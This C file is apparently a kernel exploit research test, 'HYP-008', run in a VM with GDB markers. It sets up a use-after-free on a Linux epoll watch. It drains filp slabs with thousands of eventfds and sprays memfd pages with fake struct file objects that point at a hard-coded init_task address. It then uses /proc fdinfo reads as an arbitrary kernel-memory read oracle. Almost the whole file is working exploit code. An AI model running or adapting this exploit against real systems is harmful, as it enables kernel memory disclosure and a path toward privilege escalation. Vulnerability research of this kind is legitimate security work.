// test_hyp008.c — HYP-008: Forced survivor-epoll state + oracle calibration
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/reboot.h>
#include <pthread.h>
#include <errno.h>

#define NUM_WORKERS 40
#define FILES_PER_WORKER 800   // 40 * 800 = 32,000 files (VER-046 calibrated drain)
#define NUM_SPRAY_PAGES 2048   // 2048 * 4KB = 8MB buddy page spray

static void print_str(const char *s) {
    write(STDOUT_FILENO, s, strlen(s));
}

// Markers for GDB automation
void marker_setup_done(int epA_fd, int inner_fd) {
    char buf[128];
    snprintf(buf, sizeof(buf), "[HYP-008] MARKER: setup_done epA=%d inner=%d\n", epA_fd, inner_fd);
    print_str(buf);
}

void marker_close_started(void) {
    print_str("[HYP-008] MARKER: close_started\n");
}

void marker_close_done(void) {
    print_str("[HYP-008] MARKER: close_done\n");
}

void marker_step4_baseline(void) {
    print_str("[HYP-008] MARKER: step4_baseline\n");
}

void marker_step5_spray(void) {
    print_str("[HYP-008] MARKER: step5_spray\n");
}

void marker_step5_read(void) {
    print_str("[HYP-008] MARKER: step5_read\n");
}

void marker_experiment_complete(int success) {
    char buf[128];
    snprintf(buf, sizeof(buf), "[HYP-008] MARKER: experiment_complete status=%d\n", success);
    print_str(buf);
}

static int read_fdinfo_ino(int epfd, char *out_buf, size_t max_len, unsigned long *out_ino) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epfd);
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        snprintf(out_buf, max_len, "ERR_OPEN_%d", errno);
        return -1;
    }
    int n = read(fd, out_buf, max_len - 1);
    close(fd);
    if (n <= 0) {
        snprintf(out_buf, max_len, "ERR_READ_%d", errno);
        return -1;
    }
    out_buf[n] = '\0';

    // Parse the ino from the "tfd:" line (to avoid matching the header ino: line)
    char *tfd_str = strstr(out_buf, "tfd:");
    if (tfd_str) {
        char *ino_str = strstr(tfd_str, "ino:");
        if (ino_str) {
            *out_ino = strtoul(ino_str + 4, NULL, 16);
            return 0;
        }
    }
    return -2;
}

static void drain_filp_slabs(void) {
    print_str("[*] Draining filp slab pages via worker fork-holding (32,000 files)...\n");
    pid_t pids[NUM_WORKERS];
    int sync_pipe[2];
    if (pipe(sync_pipe) < 0) return;

    for (int i = 0; i < NUM_WORKERS; i++) {
        pid_t p = fork();
        if (p == 0) {
            struct rlimit rlim = { .rlim_cur = 65536, .rlim_max = 65536 };
            setrlimit(RLIMIT_NOFILE, &rlim);
            close(sync_pipe[1]);
            int fds[FILES_PER_WORKER];
            for (int j = 0; j < FILES_PER_WORKER; j++) {
                fds[j] = eventfd(0, 0);
            }
            // Wait for release signal
            char dummy;
            read(sync_pipe[0], &dummy, 1);
            for (int j = 0; j < FILES_PER_WORKER; j++) {
                if (fds[j] >= 0) close(fds[j]);
            }
            exit(0);
        }
        pids[i] = p;
    }

    close(sync_pipe[0]);
    usleep(200000);
    print_str("[*] Releasing worker files to trigger mass slab free...\n");
    close(sync_pipe[1]);

    for (int i = 0; i < NUM_WORKERS; i++) {
        waitpid(pids[i], NULL, 0);
    }
    print_str("[*] Worker exit complete. Waiting for RCU grace period...\n");
    usleep(500000); // 500ms RCU grace wait
}

int main(int argc, char **argv) {
    print_str("====================================================\n");
    print_str("=== HYP-008: Forced Survivor-Epoll + AAR Calibration ===\n");
    print_str("====================================================\n");

    struct rlimit rlim = { .rlim_cur = 65536, .rlim_max = 65536 };
    setrlimit(RLIMIT_NOFILE, &rlim);

    mkdir("/proc", 0755);
    mount("proc", "/proc", "proc", 0, NULL);
    mkdir("/dev", 0755);
    mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);
    mknod("/dev/null", S_IFCHR | 0666, makedev(1, 3));

    // Step 1: Create epA and inner_file
    int epA = epoll_create1(0);
    if (epA < 0) {
        perror("[!] epoll_create1 epA failed");
        exit(1);
    }

    // Target inner file: an epoll fd
    int inner = epoll_create1(0);
    if (inner < 0) {
        perror("[!] epoll_create1 inner failed");
        exit(1);
    }

    struct stat st;
    fstat(inner, &st);
    char buf[256];
    snprintf(buf, sizeof(buf), "[*] Created epA=%d, inner=%d (orig inode=0x%lx)\n",
             epA, inner, (unsigned long)st.st_ino);
    print_str(buf);

    // Watch inner in epA
    struct epoll_event evA = { .events = EPOLLIN | EPOLLOUT, .data.fd = inner };
    if (epoll_ctl(epA, EPOLL_CTL_ADD, inner, &evA) < 0) {
        perror("[!] epoll_ctl ADD epA failed");
        exit(1);
    }

    marker_setup_done(epA, inner);

    // Step 2-3: Close inner fd (Thread B close path)
    marker_close_started();
    close(inner);
    marker_close_done();

    // Give time for task_work ____fput and GDB checks
    usleep(200000);

    // Step 4: Baseline read of /proc/self/fdinfo/<epA>
    marker_step4_baseline();
    char fdinfo_buf[512] = {0};
    unsigned long baseline_ino = 0;
    int res = read_fdinfo_ino(epA, fdinfo_buf, sizeof(fdinfo_buf), &baseline_ino);
    snprintf(buf, sizeof(buf), "[*] STEP 4 Baseline read (res=%d, item ino=0x%lx):\n%s\n",
             res, baseline_ino, fdinfo_buf);
    print_str(buf);

    // Step 5: Spray memfd pages with fake struct file
    marker_step5_spray();

    // Drain filp slabs to return pages to buddy
    drain_filp_slabs();

    // Spray order-0 buddy pages via memfd_create
    void *maps[NUM_SPRAY_PAGES];
    uint64_t fake_inode_addr = 0xffffffc00a0cc6d8ULL; // init_task + offsetof(comm) - offsetof(i_ino)

    print_str("[*] Spraying 2048 memfd pages with replicated fake struct file...\n");
    for (int i = 0; i < NUM_SPRAY_PAGES; i++) {
        int mfd = memfd_create("spray", MFD_CLOEXEC);
        if (mfd < 0) continue;
        ftruncate(mfd, 4096);
        maps[i] = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, mfd, 0);
        close(mfd); // fd closed, mmap mapping persists
        if (maps[i] == MAP_FAILED) continue;

        // Replicate fake struct file at every 256-byte slot offset (16 slots per 4K page)
        for (int slot = 0; slot < 4096; slot += 256) {
            uint8_t *slot_ptr = (uint8_t *)maps[i] + slot;
            memset(slot_ptr, 0, 256);
            // f_inode is at offset 32 (0x20)
            *(uint64_t *)(slot_ptr + 32) = fake_inode_addr;
            // f_pos is at offset 104 (0x68)
            *(uint64_t *)(slot_ptr + 104) = 0;
            // f_flags
            *(uint32_t *)(slot_ptr + 64) = 0;
        }
    }

    // Step 5 re-read
    marker_step5_read();
    char spray_fdinfo_buf[512] = {0};
    unsigned long spray_ino = 0;
    res = read_fdinfo_ino(epA, spray_fdinfo_buf, sizeof(spray_fdinfo_buf), &spray_ino);

    snprintf(buf, sizeof(buf), "[*] STEP 5 Spray read (res=%d, item ino=0x%lx):\n%s\n",
             res, spray_ino, spray_fdinfo_buf);
    print_str(buf);

    // Target comm for init_task is "swapper\0" -> 0x0072657070617773
    int success = 0;
    if (spray_ino == 0x0072657070617773ULL || spray_ino == 0x2f72657070617773ULL ||
        strstr(spray_fdinfo_buf, "72657070617773")) {
        print_str("[+] ========================================================\n");
        print_str("[+] SUCCESS: AAR Oracle Calibrated! ino matched swapper comm (0x72657070617773)\n");
        print_str("[+] ========================================================\n");
        success = 1;
    } else {
        snprintf(buf, sizeof(buf), "[*] Result: item spray_ino=0x%lx (expected 0x72657070617773 / 'swapper')\n", spray_ino);
        print_str(buf);
        if (res == 0) {
            print_str("[*] PARTIAL (Oracle Safety Confirmed): Read executed through non-reclaimed slab slot without kernel crash/panic.\n");
            success = 2;
        } else {
            print_str("[-] Error during fdinfo read\n");
            success = 0;
        }
    }

    marker_experiment_complete(success);

    print_str("[*] Test finished. Powering off safely.\n");
    reboot(RB_POWER_OFF);
    return 0;
}
